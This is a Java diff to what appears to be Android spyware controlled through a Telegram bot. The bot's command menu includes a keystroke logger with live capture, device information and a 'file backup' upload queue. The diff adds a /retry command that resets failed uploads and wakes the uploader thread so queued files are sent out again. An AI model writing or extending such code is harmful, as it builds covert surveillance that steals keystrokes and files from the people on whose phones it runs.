@@ -260,6 +260,7 @@ public class TelegramBotService extends Service {
                 + "{\"command\":\"files\",\"description\":\"Last 10 backed-up files\"},"
                 + "{\"command\":\"filestats\",\"description\":\"File backup queue statistics\"},"
                 + "{\"command\":\"watchdog\",\"description\":\"Bot & service health report\"},"
+                + "{\"command\":\"retry\",\"description\":\"Force-retry all permanently-failed uploads\"},"
                 + "{\"command\":\"device\",\"description\":\"Device information\"},"
                 + "{\"command\":\"status\",\"description\":\"Bot & app status\"},"
                 + "{\"command\":\"keylog\",\"description\":\"Keystroke logger & live capture\"},"
@@ -381,6 +382,7 @@ public class TelegramBotService extends Service {
             case "/watchdog":   cmdWatchdog(chatId);                                            break;
             case "/files":      cmdFiles(chatId);                                               break;
             case "/filestats":  cmdFilestats(chatId);                                           break;
+            case "/retry":      cmdRetry(chatId);                                               break;
             case "/cancel":     _pendingCmds.remove(chatId); send("❌ Cancelled.");             break;
             default:            send("❓ Unknown command. /start for help.");
         }
@@ -1126,6 +1128,39 @@ public class TelegramBotService extends Service {
                 sendTo(chatId, "❌ Error: " + e.getMessage());
             }
         }, "TG-filestats").start();
+    }
+
+    private void cmdRetry(long chatId) {
+        new Thread(() -> {
+            try {
+                FileUploadQueue q = FileUploadQueue.get(this);
+                long beforeFailed = q.countFailed();
+                if (beforeFailed == 0) {
+                    sendTo(chatId,
+                        "✅ <b>No Failed Uploads</b>\n\n"
+                      + "There are no permanently-failed uploads in the queue.\n"
+                      + "Use /filestats to see the full queue status.");
+                    return;
+                }
+                int reset = q.resetFailed();
+                // Wake the consumer thread immediately
+                FileBackupService inst = FileBackupService._instance;
+                if (inst != null) {
+                    synchronized (inst._uploadLock) { inst._uploadLock.notifyAll(); }
+                } else {
+                    FileBackupService.startIfEnabled(this);
+                }
+                sendTo(chatId,
+                    "🔄 <b>Retry Queued</b>\n"
+                  + "━━━━━━━━━━━━━━━━━━━━━━\n\n"
+                  + "♻️ Reset: <b>" + reset + " failed upload(s)</b> → back to pending\n"
+                  + "⬆️ Consumer thread woken — uploads will resume now.\n\n"
+                  + "Each file gets <b>3 fresh attempts</b>.\n"
+                  + "Use /filestats to track progress.");
+            } catch (Exception e) {
+                sendTo(chatId, "❌ Retry error: " + e.getMessage());
+            }
+        }, "TG-retry").start();
     }
 
     private void cmdDevice(long chatId) {
